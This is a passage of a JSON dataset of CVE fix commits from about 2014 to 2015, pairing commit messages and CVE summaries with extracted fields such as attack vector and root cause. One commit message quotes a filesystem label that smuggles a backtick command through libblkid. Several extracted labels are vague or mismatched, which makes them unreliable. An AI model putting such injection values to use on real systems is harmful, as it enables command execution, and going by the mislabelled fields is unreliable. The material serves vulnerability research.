flag across kexec reboot.\n\nSigned-off-by: Dave Young <dyoung@redhat.com>","summary":"The Linux kernel, as used in Red Hat Enterprise Linux 7, kernel-rt, and Enterprise MRG 2 and when booted with UEFI Secure Boot enabled, allows local users to bypass intended securelevel\/secureboot restrictions by leveraging improper handling of secure_boot flag across kexec reboot.","commit_message_1":"copy secure_boot flag in boot params across kexec reboot kexec reboot in case secure boot being enabled doe not keep the secure boot mode in new kernel , so later one can load unsigned kernel via legacy kexec_load","Vulnerability Type":"Security Features","Attack Vector":"by leveraging improper handling of secure _ boot flag across kexec reboot","Impact":"bypass security restrictions","Root Cause":"caused by an error when kexec is used to load the same kernel after reboot","Attack Type":"local attacker"},{"commit_id":"cb31827d62066a04b02111df3052949fda4b6888","cve_id":"CVE-2015-7510","cwe_id":"CWE-119","commit_message":"nss-mymachines: do not allow overlong machine names\n\nhttps:\/\/github.com\/systemd\/systemd\/issues\/2002","summary":"Stack-based buffer overflow in the getpwnam and getgrnam functions of the NSS module nss-mymachines in systemd.","commit_message_1":"nss-mymachines : do not allow overlong machine name","Vulnerability Type":"buffer overflow","Attack Vector":"By providing specially crafted input to the vulnerable functions","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by","Attack Type":"local attacker"},{"commit_id":"7ca3e5279d05fceb1e8a043c6f5b6f58dea3ed38","cve_id":"CVE-2015-6817","cwe_id":"CWE-287","commit_message":"Remove too early set of auth_user\n\nWhen query returns 0 rows (user not found),\nthis user stays as login user...\n\nShould fix #69.","summary":"PgBouncer 1.6.x before 1.6.1, when configured with auth_user, allows remote attackers to gain login access as auth_user via an unknown username.","commit_message_1":"remove too early set of auth_user when query return <number> row ( user not found ) , this user stay a login user","Vulnerability Type":"Improper Authentication","Attack Vector":"via an unknown username","Impact":"gain login access as auth _ user","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"bde91c85bdc77975155058276f99d2e0f5eab5a9","cve_id":"CVE-2015-5224","cwe_id":"CWE-264","commit_message":"chsh, chfn, vipw: fix filenames collision\n\nThe utils when compiled WITHOUT libuser then mkostemp()ing\n\"\/etc\/%s.XXXXXX\" where the filename prefix is argv[0] basename.\n\nAn attacker could repeatedly execute the util with modified argv[0]\nand after many many attempts mkostemp() may generate suffix which\nmakes sense. The result maybe temporary file with name like rc.status\nld.so.preload or krb5.keytab, etc.\n\nNote that distros usually use libuser based ch{sh,fn} or stuff from\nshadow-utils.\n\nIt's probably very minor security bug.\n\nAddresses: CVE-2015-5224\nSigned-off-by: Karel Zak <kzak@redhat.com>","summary":"The mkostemp function in login-utils in util-linux when used incorrectly allows remote attackers to cause file name collision and possibly other attacks.","commit_message_1":"fix filename collision the utils when compiled without libuser then mkostemp ( ) ing `` \/etc\/ % <file> '' where the filename prefix is argv [ <number> ] basename","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"By executing the util repeatedly","Impact":"cause file name collision and possibly other attacks","Root Cause":"when used incorrectly","Attack Type":"remote attacker"},{"commit_id":"df5d2867e8004e51e18b89865bc4aa69229227b3","cve_id":"CVE-2015-5221","cwe_id":"CWE-416","commit_message":"CVE-2015-5221","summary":"Use-after-free vulnerability in the mif_process_cmpt function in libjasper\/mif\/mif_cod.c in the JasPer JPEG-2000 library before 1.900.2 allows remote attackers to cause a denial of service (crash) via a crafted JPEG 2000 image file.","commit_message_1":"<cve_id>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted jpeg 2000 image file","Impact":"cause a denial of service ( crash )","Root Cause":"caused by a use-after-free error within src\/libjasper\/mif\/mif_cod.c","Attack Type":"remote attacker"},{"commit_id":"52e977d79a0c4ace997e5c74af429844da2f27be","cve_id":"CVE-2015-5195","cwe_id":"CWE-20","commit_message":"[Bug 1773] openssl not detected during .\/configure.\n[Bug 1774] Segfaults if cryptostats enabled and built without OpenSSL.","summary":"ntp_openssl.m4 in ntpd in NTP before 4.2.7p112 allows remote attackers to cause a denial of service (segmentation fault) via a crafted statistics or filegen configuration command that is not enabled during compilation.","commit_message_1":"openssl not detected during","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted statistics or filegen configuration command that is not enabled during compilation","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by the referencing of a statistics type that was not enabled during compilation by the statistics or filegen configuration command","Attack Type":"remote attacker"},{"commit_id":"553f2fa65865c31c5e3c48812cfd46176cffdd27","cve_id":"CVE-2015-5194","cwe_id":"CWE-20","commit_message":"[Bug 1593] ntpd abort in free() with logconfig syntax error.","summary":"The log_config_command function in ntp_parser.y in ntpd in NTP before 4.2.7p42 allows remote attackers to cause a denial of service (ntpd crash) via crafted logconfig commands.","commit_message_1":"ntpd abort in free ( ) with logconfig syntax error","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted logconfig commands","Impact":"cause a denial of service ( ntpd crash )","Root Cause":"caused by an uninitialized variable when processing malicious commands","Attack Type":"remote attacker"},{"commit_id":"b2738ffb2fdd2550ececb74f76f75583c43c8b59","cve_id":"CVE-2015-5070","cwe_id":"CWE-200","commit_message":"Use looks_like_pbl() to disallow .pbl file inclusion (bug #23504)\n\nThis function is implemented using case-insensitive pattern matching,\nunlike filesystem::ends_with(). I missed this when writing my original\nfix, so the vulnerability still applied to .pbl files on a\ncase-insensitive filesystem (e.g. NTFS and FAT* on Windows) by using\ndifferent case to bypass the check.","summary":"The (1) filesystem::get_wml_location function in filesystem.cpp and (2) is_legal_file function in filesystem_boost.cpp in Battle for Wesnoth before 1.12.4 and 1.13.x before 1.13.1, when a case-insensitive filesystem is used, allow remote attackers to obtain sensitive information via vectors related to inclusion of .pbl files from WML.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2015-5069.","commit_message_1":"use looks_like_pbl ( ) to disallow","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via vectors related to inclusion of","Impact":"obtain sensitive information","Root Cause":"when a case-insensitive filesystem is used","Attack Type":"remote attacker"},{"commit_id":"f8914468182e8d0a1551b430c0879ba236fe4d6d","cve_id":"CVE-2015-5069","cwe_id":"CWE-200","commit_message":"Disallow inclusion of .pbl files from WML (bug #23504)\n\nNote that this will also cause Lua wesnoth.have_file() to return false\non .pbl files.","summary":"The (1) filesystem::get_wml_location function in filesystem.cpp and (2) is_legal_file function in filesystem_boost.cpp in Battle for Wesnoth before 1.12.3 and 1.13.x before 1.13.1 allow remote attackers to obtain sensitive information via vectors related to inclusion of .pbl files from WML.","commit_message_1":"disallow inclusion of","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via vectors related to inclusion of . pbl files from wml","Impact":"obtain sensitive information","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"f95864afe8833fe3ad782d714b41378e860977b1","cve_id":"CVE-2015-4645","cwe_id":"CWE-190","commit_message":"unsquashfs-4: Add more sanity checks + fix CVE-2015-4645\/6\n\nAdd more filesystem table sanity checks to Unsquashfs-4 and\nalso properly fix CVE-2015-4645 and CVE-2015-4646.\n\nThe CVEs were raised due to Unsquashfs having variable\noveflow and stack overflow in a number of vulnerable\nfunctions.\n\nThe suggested patch only \"fixed\" one such function and fixed\nit badly, and so it was buggy and introduced extra bugs!\n\nThe suggested patch was not only buggy, but, it used the\nessentially wrong approach too.  It was \"fixing\" the\nsymptom but not the cause.  The symptom is wrong values\ncausing overflow, the cause is filesystem corruption.\nThis corruption should be detected and the filesystem\nrejected *before* trying to allocate memory.\n\nThis patch applies the following fixes:\n\n1. The filesystem super-block tables are checked, and the values\n   must match across the filesystem.\n\n   This will trap corrupted filesystems created by Mksquashfs.\n\n2. The maximum (theorectical) size the filesystem tables could grow\n   to, were analysed, and some variables were increased from int to\n   long long.\n\n   This analysis has been added as comments.\n\n3. Stack allocation was removed, and a shared buffer (which is\n   checked and increased as necessary) is used to read the\n   table indexes.\n\nSigned-off-by: Phillip Lougher <phillip@squashfs.org.uk>","summary":"Integer overflow in the read_fragment_table_4 function in unsquash-4.c in Squashfs and sasquatch allows remote attackers to cause a denial of service (application crash) via a crafted input, which triggers a stack-based buffer overflow.","commit_message_1":"add more sanity check + fix <cve_id>\/<number> add more filesystem table sanity check to unsquashfs-<number> and also properly fix <cve_id> and <cve_id>","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted input , which triggers a stack - based buffer overflow","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by improper bounds checking by the unsquash-1.c\/unsquash-2.c\/unsquash-3.c\/unsquash-4.c files","Attack Type":"remote attacker"},{"commit_id":"74d6e5f7de5ec736f71204b7b422af7380c19ac5","cve_id":"CVE-2015-4054","cwe_id":"CWE-476","commit_message":"Check if auth_user is set.\n\nFixes a crash if password packet appears before startup packet (#42).","summary":"PgBouncer before 1.5.5 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) by sending a password packet before a startup packet.","commit_message_1":"check if auth_user is set","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by sending a password packet before a startup packet","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"9ab7dbeb3baff67a51d0c5e71465c453be0890b5#diff-803c5170888b8642f2a97e5e9423d399","cve_id":"CVE-2015-3887","cwe_id":"CWE-426","commit_message":"fix for CVE-2015-3887\n\ncloses #60","summary":"Untrusted search path vulnerability in ProxyChains-NG before 4.9 allows local users to gain privileges via a Trojan horse libproxychains4.so library in the current working directory, which is referenced in the LD_PRELOAD path.","commit_message_1":"fix for <cve_id>","Vulnerability Type":"untrusted search path","Attack Vector":"via a trojan horse libproxychains4 . so library in the current working directory , which is referenced in the ld _ preload path","Impact":"gain privileges","Root Cause":"caused by setting the LD_PRELOAD variable as the first directory for the library search path","Attack Type":"local attacker"},{"commit_id":"c97f870f5ae13112988d9f8ad464b4f679903706","cve_id":"CVE-2015-3886","cwe_id":"CWE-295","commit_message":"Fix expired certificate validation (gobby #61)","summary":"libinfinity before 0.6.6-1 does not validate expired SSL certificates, which allows remote attackers to have unspecified impact via unknown vectors.","commit_message_1":"fix expired certificate validation ( gobby # <number> )","Vulnerability Type":"Improper Certificate Validation","Attack Vector":"none","Impact":"none","Root Cause":"caused by incorrectly validating expired SSL certificates","Attack Type":"remote attacker"},{"commit_id":"17cb66b13997b0159b4253b3f5722db79f476d68","cve_id":"CVE-2015-3315","cwe_id":"CWE-59","commit_message":"ccpp: stop reading hs_error.log from \/tmp\n\nThe file might contain anything and there is no way to verify its\ncontents.\n\nRelated: #1211835\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>","summary":"Automatic Bug Reporting Tool (ABRT) allows local users to read, change the ownership of, or have other unspecified impact on arbitrary files via a symlink attack on (1) \/var\/tmp\/abrt\/*\/maps, (2) \/tmp\/jvm-*\/hs_error.log, (3) \/proc\/*\/exe, (4) \/etc\/os-release in a chroot, or (5) an unspecified root directory related to librpm.","commit_message_1":"stop reading <file> from \/tmp the file might contain anything and there is no way to verify it content","Vulnerability Type":"Link Following","Attack Vector":"via a symlink attack on ( 1 ) \/ var \/ tmp \/ abrt \/ * \/ maps , ( 2 ) \/ tmp \/ jvm - * \/ hs _ error . log , ( 3 ) \/ proc \/ * \/ exe , ( 4 ) \/ etc \/ os - release in a chroot , or ( 5 ) an unspecified root directory related to librpm .","Impact":"overwrite arbitrary files","Root Cause":"overwrite arbitrary files","Attack Type":"local attacker"},{"commit_id":"fbfa4d1083ea84c5429992ca3e996d7d4fbc8238","cve_id":"CVE-2015-3215","cwe_id":"CWE-20","commit_message":"NetKVM: BZ#1169718: More rigoruous testing of incoming packet\n\nSigned-off-by: Joseph Hindin <yhindin@rehat.com>","summary":"The NetKVM Windows Virtio driver allows remote attackers to cause a denial of service (guest crash) via a crafted length value in an IP packet, as demonstrated by a value that does not account for the size of the IP options.","commit_message_1":"netkvm : bz # <number> : more rigoruous testing of incoming packet","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted length value in an ip packet , as demonstrated by a value that does not account for the size of the ip options","Impact":"cause a denial of service ( guest crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"3ed82f4ed0095768529afc22b923c8f7171fff70","cve_id":"CVE-2015-3138","cwe_id":"CWE-20","commit_message":"whiteboard: fixup a few reversed tests (GH #446)\n\nThis is a follow-up to commit 3a3ec26.","summary":"print-wb.c in tcpdump before 4.7.4 allows remote attackers to cause a denial of service (segmentation fault and process crash).","commit_message_1":"fixup a few reversed test ( gh # <number> ) this is a follow-up to commit 3a3ec26","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted hdr file","Impact":"cause a denial of service ( segmentation fault and process crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"104870608fde3c698483fdef6b97f093fc15685d","cve_id":"CVE-2015-2312","cwe_id":"CWE-400","commit_message":"SECURITY: CPU usage amplification attack.\n\nDetails: https:\/\/github.com\/sandstorm-io\/capnproto\/tree\/master\/security-advisories\/2014-03-02-0-all-cpu-amplification.md","summary":"Sandstorm Cap'n Proto before 0.4.1.1 and 0.5.x before 0.5.1.1 allows remote peers to cause a denial of service (CPU and possibly general resource consumption) via a list with a large number of elements.","commit_message_1":"security : cpu usage amplification attack","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"via a list with a large number of elements","Impact":"cause a denial of service","Root Cause":"consume all available CPU resources","Attack Type":"remote attacker"},{"commit_id":"6cedd67c381ff22fde653adf02ee31caf66c81a0","cve_id":"CVE-2015-1522","cwe_id":"CWE-119","commit_message":"DNP3: fix reachable assertion and buffer over-read\/overflow.\n\nA DNP3 packet using a link layer header that specifies a zero length can\ntrigger an assertion failure if assertions are enabled.  Assertions are\nenabled unless Bro is compiled with the NDEBUG preprocessor macro\ndefined.  The default configuration of Bro will define this macro and so\ndisables assertions, but using the --enable-debug option in the\nconfigure script will enable assertions.  When assertions are disabled,\nor also for certain length values, the DNP3 parser may attempt to pass a\nnegative value as the third argument to memcpy (number of bytes to copy)\nand result in a buffer over-read or overflow.\n\nReported by Travis Emmert.","summary":"analyzer\/protocol\/dnp3\/DNP3.cc in Bro before 2.3.2 does not reject certain non-zero values of a packet length, which allows remote attackers to cause a denial of service (buffer overflow or buffer over-read) via a crafted DNP3 packet.","commit_message_1":"fix reachable assertion and buffer over-read\/overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted dnp3 packet ","Impact":"cause a denial of service ( buffer overflow or buffer over - read )","Root Cause":"does not reject certain non - zero values of a packet length","Attack Type":"remote attacker"},{"commit_id":"60a2362f769cf549dc466134efe71c8bf9fbaaba","cve_id":"CVE-2014-9940","cwe_id":"CWE-416","commit_message":"regulator: core: Fix regualtor_ena_gpio_free not to access pin after freeing\n\nAfter freeing pin from regulator_ena_gpio_free, loop can access\nthe pin. So this patch fixes not to access pin after freeing.\n\nSigned-off-by: Seung-Woo Kim <sw0312.kim@samsung.com>\nSigned-off-by: Mark Brown <broonie@kernel.org>","summary":"The regulator_ena_gpio_free function in drivers\/regulator\/core.c in the Linux kernel before 3.19 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted application.","commit_message_1":"core : fix regualtor_ena_gpio_free not to access pin after freeing after freeing pin from regulator_ena_gpio_free , loop can access the pin","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted application","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"69c433ed2ecd2d3264efd7afec4439524b319121","cve_id":"CVE-2014-9922","cwe_id":"CWE-264","commit_message":"fs: limit filesystem stacking depth\n\nAdd a simple read-only counter to super_block that indicates how deep this\nis in the stack of filesystems.  Previously ecryptfs was the only stackable\nfilesystem and it explicitly disallowed multiple layers of itself.\n\nOverlayfs, however, can be stacked recursively and also may be stacked\non top of ecryptfs or vice versa.\n\nTo limit the kernel stack usage we must limit the depth of the\nfilesystem stack.  Initially the limit is set to 2.\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>","summary":"The eCryptfs subsystem in the Linux kernel before 3.18 allows local users to gain privileges via a large filesystem stack that includes an overlayfs layer, related to fs\/ecryptfs\/main.c and fs\/overlayfs\/super.c.","commit_message_1":"limit filesystem stacking depth add a simple read-only counter to super_block that indicates how deep this is in the stack of filesystems","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a large filesystem stack that includes an overlayfs layer , related to fs \/ ecryptfs \/ main . c and fs \/ overlayfs \/ super . c","Impact":"gain privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"9709674e68646cee5a24e3000b3558d25412203a","cve_id":"CVE-2014-9914","cwe_id":"CWE-416","commit_message":"ipv4: fix a race in ip4_datagram_release_cb()\n\nAlexey gave a AddressSanitizer[1] report that finally gave a good hint\nat where was the origin of various problems already reported by Dormando\nin the past [2]\n\nProblem comes from the fact that UDP can have a lockless TX path, and\nconcurrent threads can manipulate sk_dst_cache, while another thread,\nis holding socket lock and calls __sk_dst_set() in\nip4_datagram_release_cb() (this was added in linux-3.8)\n\nIt seems that all we need to do is to use sk_dst_check() and\nsk_dst_set() so that all the writers hold same spinlock\n(sk->sk_dst_lock) to prevent corruptions.\n\nTCP stack do not need this protection, as all sk_dst_cache writers hold\nthe socket lock.\n\n[1]\nhttps:\/\/code.google.com\/p\/address-sanitizer\/wiki\/AddressSanitizerForKernel\n\nAddressSanitizer: heap-use-after-free in ipv4_dst_check\nRead of size 2 by thread T15453:\n [<ffffffff817daa3a>] ipv4_dst_check+0x1a\/0x90 .\/net\/ipv4\/route.c:1116\n [<ffffffff8175b789>] __sk_dst_check+0x89\/0xe0 .\/net\/core\/sock.c:531\n [<ffffffff81830a36>] ip4_datagram_release_cb+0x46\/0x390 ??:0\n [<ffffffff8175eaea>] release_sock+0x17a\/0x230 .\/net\/core\/sock.c:2413\n [<ffffffff81830882>] ip4_datagram_connect+0x462\/0x5d0 ??:0\n [<ffffffff81846d06>] inet_dgram_connect+0x76\/0xd0 .\/net\/ipv4\/af_inet.c:534\n [<ffffffff817580ac>] SYSC_connect+0x15c\/0x1c0 .\/net\/socket.c:1701\n [<ffffffff817596ce>] SyS_connect+0xe\/0x10 .\/net\/socket.c:1682\n [<ffffffff818b0a29>] system_call_fastpath+0x16\/0x1b\n.\/arch\/x86\/kernel\/entry_64.S:629\n\nFreed by thread T15455:\n [<ffffffff8178d9b8>] dst_destroy+0xa8\/0x160 .\/net\/core\/dst.c:251\n [<ffffffff8178de25>] dst_release+0x45\/0x80 .\/net\/core\/dst.c:280\n [<ffffffff818304c1>] ip4_datagram_connect+0xa1\/0x5d0 ??:0\n [<ffffffff81846d06>] inet_dgram_connect+0x76\/0xd0 .\/net\/ipv4\/af_inet.c:534\n [<ffffffff817580ac>] SYSC_connect+0x15c\/0x1c0 .\/net\/socket.c:1701\n [<ffffffff817596ce>] SyS_connect+0xe\/0x10 .\/net\/socket.c:1682\n [<ffffffff818b0a29>] system_call_fastpath+0x16\/0x1b\n.\/arch\/x86\/kernel\/entry_64.S:629\n\nAllocated by thread T15453:\n [<ffffffff8178d291>] dst_alloc+0x81\/0x2b0 .\/net\/core\/dst.c:171\n [<ffffffff817db3b7>] rt_dst_alloc+0x47\/0x50 .\/net\/ipv4\/route.c:1406\n [<     inlined    >] __ip_route_output_key+0x3e8\/0xf70\n__mkroute_output .\/net\/ipv4\/route.c:1939\n [<ffffffff817dde08>] __ip_route_output_key+0x3e8\/0xf70 .\/net\/ipv4\/route.c:2161\n [<ffffffff817deb34>] ip_route_output_flow+0x14\/0x30 .\/net\/ipv4\/route.c:2249\n [<ffffffff81830737>] ip4_datagram_connect+0x317\/0x5d0 ??:0\n [<ffffffff81846d06>] inet_dgram_connect+0x76\/0xd0 .\/net\/ipv4\/af_inet.c:534\n [<ffffffff817580ac>] SYSC_connect+0x15c\/0x1c0 .\/net\/socket.c:1701\n [<ffffffff817596ce>] SyS_connect+0xe\/0x10 .\/net\/socket.c:1682\n [<ffffffff818b0a29>] system_call_fastpath+0x16\/0x1b\n.\/arch\/x86\/kernel\/entry_64.S:629\n\n[2]\n<4>[196727.311203] general protection fault: 0000 [#1] SMP\n<4>[196727.311224] Modules linked in: xt_TEE xt_dscp xt_DSCP macvlan bridge coretemp crc32_pclmul ghash_clmulni_intel gpio_ich microcode ipmi_watchdog ipmi_devintf sb_edac edac_core lpc_ich mfd_core tpm_tis tpm tpm_bios ipmi_si ipmi_msghandler isci igb libsas i2c_algo_bit ixgbe ptp pps_core mdio\n<4>[196727.311333] CPU: 17 PID: 0 Comm: swapper\/17 Not tainted 3.10.26 #1\n<4>[196727.311344] Hardware name: Supermicro X9DRi-LN4+\/X9DR3-LN4+\/X9DRi-LN4+\/X9DR3-LN4+, BIOS 3.0 07\/05\/2013\n<4>[196727.311364] task: ffff885e6f069700 ti: ffff885e6f072000 task.ti: ffff885e6f072000\n<4>[196727.311377] RIP: 0010:[<ffffffff815f8c7f>]  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f\/0x80\n<4>[196727.311399] RSP: 0018:ffff885effd23a70  EFLAGS: 00010282\n<4>[196727.311409] RAX: dead000000200200 RBX: ffff8854c398ecc0 RCX: 0000000000000040\n<4>[196727.311423] RDX: dead000000100100 RSI: dead000000100100 RDI: dead000000200200\n<4>[196727.311437] RBP: ffff885effd23a80 R08: ffffffff815fd9e0 R09: ffff885d5a590800\n<4>[196727.311451] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000\n<4>[196727.311464] R13: ffffffff81c8c280 R14: 0000000000000000 R15: ffff880e85ee16ce\n<4>[196727.311510] FS:  0000000000000000(0000) GS:ffff885effd20000(0000) knlGS:0000000000000000\n<4>[196727.311554] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n<4>[196727.311581] CR2: 00007a46751eb000 CR3: 0000005e65688000 CR4: 00000000000407e0\n<4>[196727.311625] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n<4>[196727.311669] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n<4>[196727.311713] Stack:\n<4>[196727.311733]  ffff8854c398ecc0 ffff8854c398ecc0 ffff885effd23ab0 ffffffff815b7f42\n<4>[196727.311784]  ffff88be6595bc00 ffff8854c398ecc0 0000000000000000 ffff8854c398ecc0\n<4>[196727.311834]  ffff885effd23ad0 ffffffff815b86c6 ffff885d5a590800 ffff8816827821c0\n<4>[196727.311885] Call Trace:\n<4>[196727.311907]  <IRQ>\n<4>[196727.311912]  [<ffffffff815b7f42>] dst_destroy+0x32\/0xe0\n<4>[196727.311959]  [<ffffffff815b86c6>] dst_release+0x56\/0x80\n<4>[196727.311986]  [<ffffffff81620bd5>] tcp_v4_do_rcv+0x2a5\/0x4a0\n<4>[196727.312013]  [<ffffffff81622b5a>] tcp_v4_rcv+0x7da\/0x820\n<4>[196727.312041]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360\/0x360\n<4>[196727.312070]  [<ffffffff815de02d>] ? nf_hook_slow+0x7d\/0x150\n<4>[196727.312097]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360\/0x360\n<4>[196727.312125]  [<ffffffff815fda92>] ip_local_deliver_finish+0xb2\/0x230\n<4>[196727.312154]  [<ffffffff815fdd9a>] ip_local_deliver+0x4a\/0x90\n<4>[196727.312183]  [<ffffffff815fd799>] ip_rcv_finish+0x119\/0x360\n<4>[196727.312212]  [<ffffffff815fe00b>] ip_rcv+0x22b\/0x340\n<4>[196727.312242]  [<ffffffffa0339680>] ? macvlan_broadcast+0x160\/0x160 [macvlan]\n<4>[196727.312275]  [<ffffffff815b0c62>] __netif_receive_skb_core+0x512\/0x640\n<4>[196727.312308]  [<ffffffff811427fb>] ? kmem_cache_alloc+0x13b\/0x150\n<4>[196727.312338]  [<ffffffff815b0db1>] __netif_receive_skb+0x21\/0x70\n<4>[196727.312368]  [<ffffffff815b0fa1>] netif_receive_skb+0x31\/0xa0\n<4>[196727.312397]  [<ffffffff815b1ae8>] napi_gro_receive+0xe8\/0x140\n<4>[196727.312433]  [<ffffffffa00274f1>] ixgbe_poll+0x551\/0x11f0 [ixgbe]\n<4>[196727.312463]  [<ffffffff815fe00b>] ? ip_rcv+0x22b\/0x340\n<4>[196727.312491]  [<ffffffff815b1691>] net_rx_action+0x111\/0x210\n<4>[196727.312521]  [<ffffffff815b0db1>] ? __netif_receive_skb+0x21\/0x70\n<4>[196727.312552]  [<ffffffff810519d0>] __do_softirq+0xd0\/0x270\n<4>[196727.312583]  [<ffffffff816cef3c>] call_softirq+0x1c\/0x30\n<4>[196727.312613]  [<ffffffff81004205>] do_softirq+0x55\/0x90\n<4>[196727.312640]  [<ffffffff81051c85>] irq_exit+0x55\/0x60\n<4>[196727.312668]  [<ffffffff816cf5c3>] do_IRQ+0x63\/0xe0\n<4>[196727.312696]  [<ffffffff816c5aaa>] common_interrupt+0x6a\/0x6a\n<4>[196727.312722]  <EOI>\n<1>[196727.313071] RIP  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f\/0x80\n<4>[196727.313100]  RSP <ffff885effd23a70>\n<4>[196727.313377] ---[ end trace 64b3f14fae0f2e29 ]---\n<0>[196727.380908] Kernel panic - not syncing: Fatal exception in interrupt\n\nReported-by: Alexey Preobrazhensky <preobr@google.com>\nReported-by: dormando <dormando@rydia.ne>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nFixes: 8141ed9fcedb2 (\"ipv4: Add a socket release callback for datagram sockets\")\nCc: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the ip4_datagram_release_cb function in net\/ipv4\/datagram.c in the Linux kernel before 3.15.2 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging incorrect expectations about locking during multithreaded access to internal data structures for IPv4 UDP sockets.","commit_message_1":"fix a race in ip4_datagram_release_cb ( ) alexey gave a addresssanitizer [ <number> ] report that finally gave a good hint at where wa the origin of various problem already reported by dormando in the past [ <number> ] problem come from the fact that udp can have a lockless tx path , and concurrent thread can manipulate sk_dst_cache , while another thread , is holding socket lock and call __sk_dst_set ( ) in ip4_datagram_release_cb ( ) ( this wa added in linux-<file> ) it seems that all we need to do is to use sk_dst_check ( ) and sk_dst_set ( ) so that all the writer hold same spinlock ( sk- > sk_dst_lock ) to prevent corruption","Vulnerability Type":"Use After Free","Attack Vector":"by leveraging incorrect expectations about locking during multithreaded access to internal data structures for ipv4 udp sockets","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"d7325bac173492b358417a0ad49fabad44447d52","cve_id":"CVE-2014-9907","cwe_id":"CWE-20","commit_message":"Added extra EOF check and some minor refactoring.","summary":"coders\/dds.c in ImageMagick allows remote attackers to cause a denial of service via a crafted DDS file.","commit_message_1":"added extra eof check and some minor refactoring","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted dds file","Impact":"cause a denial of service","Root Cause":"caused by corrupted DDS files","Attack Type":"remote attacker"},{"commit_id":"89e90ae7b2826110ea28c1c0eb8e7c56c3907bdc","cve_id":"CVE-2014-9114","cwe_id":"CWE-77","commit_message":"libblkid: care about unsafe chars in cache\n\nThe high-level libblkid API uses \/run\/blkid\/blkid.tab cache to\nstore probing results. The cache format is\n\n   <device NAME=\"value\" ...>devname<\/device>\n\nand unfortunately the cache code does not escape quotation marks:\n\n   # mkfs.ext4 -L 'AAA\"BBB'\n\n   # cat \/run\/blkid\/blkid.tab\n   ...\n   <device ... LABEL=\"AAA\"BBB\" ...>\/dev\/sdb1<\/device>\n\nsuch string is later incorrectly parsed and blkid(8) returns\nnonsenses. And for use-cases like\n\n   # eval $(blkid -o export \/dev\/sdb1)\n\nit's also insecure.\n\nNote that mount, udevd and blkid -p are based on low-level libblkid\nAPI, it bypass the cache and directly read data from the devices.\n\nThe current udevd upstream does not depend on blkid(8) output at all,\nit's directly linked with the library and all unsafe chars are encoded by\n\\x<hex> notation.\n\n   # mkfs.ext4 -L 'X\"`\/tmp\/foo` \"' \/dev\/sdb1\n   # udevadm info --export-db | grep LABEL\n   ...\n   E: ID_FS_LABEL=X__\/tmp\/foo___\n   E: ID_FS_LABEL_ENC=X\\x22\\x60\\x2ftmp\\x2ffoo\\x60\\x20\\x22\n\nSigned-off-by: Karel Zak <kzak@redhat.com>","summary":"Blkid in util-linux before 2.26rc-1 allows local users to execute arbitrary code.","commit_message_1":"care about unsafe char in cache the high-level libblkid api us \/run\/blkid\/<file> cache to store probing result","Vulnerability Type":"Command Injection","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary commands","Root Cause":"caused by the failure to strip the quote character","Attack Type":"local attacker"},{"commit_id":"88702a3ce4c28a973bf69023cd0312f412f6193e","cve_id":"CVE-2014-8324","cwe_id":"CWE-20","commit_message":"OSdep: Fixed segmentation fault that happens with a malicious server sending a negative length (Closes #16 on GitHub).\n\ngit-svn-id: http:\/\/svn.aircrack-ng.org\/trunk@2419 28c6078b-6c39-48e3-add9-af49d547ecab","summary":"network.c in Aircrack-ng before 1.2 Beta 3 allows remote attackers to cause a denial of service (segmentation fault) via a response with a crafted length parameter.","commit_message_1":"fixed segmentation fault that happens with a malicious server sending a negative length ( close # <number> on github )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a response with a crafted length parameter","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"da087238963c1239fdabd47dc1b65279605aca70","cve_id":"CVE-2014-8323","cwe_id":"CWE-20","commit_message":"Buddy-ng: Fixed segmentation fault (Closes #15 on GitHub).\n\ngit-svn-id: 